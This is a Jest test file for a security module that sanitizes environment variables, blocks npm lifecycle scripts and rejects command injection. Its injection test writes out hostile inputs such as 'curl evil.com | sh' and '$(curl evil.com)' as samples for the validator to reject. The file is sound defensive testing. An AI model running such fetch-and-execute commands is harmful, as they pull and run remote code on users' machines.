import {
  sanitizeEnvironment,
  sanitizeCommand,
  parseCommand,
  validateScriptName,
  validatePackageJsonScripts,
  BLOCKED_SCRIPTS,
  SECURITY_CONFIG,
} from '../src/utils/security';

describe('Security Utils', () => {
  describe('sanitizeEnvironment', () => {
    it('should only keep safe environment variables', () => {
      const env = {
        NODE_ENV: 'production',
        PORT: '3000',
        GITHUB_TOKEN: 'secret123',
        AWS_SECRET_KEY: 'aws_secret',
        API_KEY: 'api_key',
        PATH: '/usr/bin',
        HOME: '/home/user',
      };

      const sanitized = sanitizeEnvironment(env);

      expect(sanitized.NODE_ENV).toBe('development');
      expect(sanitized.GITHUB_TOKEN).toBeUndefined();
      expect(sanitized.AWS_SECRET_KEY).toBeUndefined();
      expect(sanitized.API_KEY).toBeUndefined();
      expect(sanitized.PATH).toBe('/usr/bin');
      expect(sanitized.HOME).toBe('/tmp');
    });

    it('should set safe defaults', () => {
      const sanitized = sanitizeEnvironment({});

      expect(sanitized.NODE_ENV).toBe('development');
      expect(sanitized.HOME).toBe('/tmp');
      expect(sanitized.TMPDIR).toBe('/tmp');
    });
  });

  describe('validateScriptName', () => {
    it('should allow safe scripts', () => {
      expect(validateScriptName('install')).toBe(true);
      expect(validateScriptName('build')).toBe(true);
      expect(validateScriptName('start')).toBe(true);
      expect(validateScriptName('dev')).toBe(true);
    });

    it('should block dangerous scripts', () => {
      expect(validateScriptName('postinstall')).toBe(false);
      expect(validateScriptName('preinstall')).toBe(false);
      expect(validateScriptName('prepare')).toBe(false);
      expect(validateScriptName('prepublish')).toBe(false);
    });
  });

  describe('sanitizeCommand', () => {
    it('should allow safe commands', () => {
      expect(sanitizeCommand('npm install')).toBe('npm install');
      expect(sanitizeCommand('npm run build')).toBe('npm run build');
      expect(sanitizeCommand('node server.js')).toBe('node server.js');
    });

    it('should block command injection', () => {
      expect(() => sanitizeCommand('$(curl evil.com)')).toThrow();
      expect(() => sanitizeCommand('`curl evil.com`')).toThrow();
      expect(() => sanitizeCommand('npm install | bash')).toThrow();
      expect(() => sanitizeCommand('curl evil.com | sh')).toThrow();
    });
  });

  describe('parseCommand', () => {
    it('should parse simple commands', () => {
      const result = parseCommand('npm install');
      expect(result.cmd).toBe('npm');
      expect(result.args).toEqual(['install']);
    });

    it('should parse commands with arguments', () => {
      const result = parseCommand('npm run build --production');
      expect(result.cmd).toBe('npm');
      expect(result.args).toEqual(['run', 'build', '--production']);
    });

    it('should throw on empty command', () => {
      expect(() => parseCommand('')).toThrow();
    });
  });

  describe('validatePackageJsonScripts', () => {
    it('should keep safe scripts', () => {
      const scripts = {
        start: 'node server.js',
        build: 'tsc',
        dev: 'ts-node index.ts',
        postinstall: 'evil-command',
        prepare: 'evil-command',
      };

      const sanitized = validatePackageJsonScripts(scripts);

      expect(sanitized.start).toBe('node server.js');
      expect(sanitized.build).toBe('tsc');
      expect(sanitized.dev).toBe('ts-node index.ts');
      expect(sanitized.postinstall).toBeUndefined();
      expect(sanitized.prepare).toBeUndefined();
    });
  });

  describe('SECURITY_CONFIG', () => {
    it('should have reasonable limits', () => {
      expect(SECURITY_CONFIG.maxConcurrentPreviews).toBeLessThanOrEqual(10);
      expect(SECURITY_CONFIG.maxDiskUsageMB).toBeLessThanOrEqual(1000);
      expect(SECURITY_CONFIG.maxTimeoutMs).toBeLessThanOrEqual(600000);
      expect(SECURITY_CONFIG.maxIdleMs).toBeLessThanOrEqual(1200000);
    });
  });
});
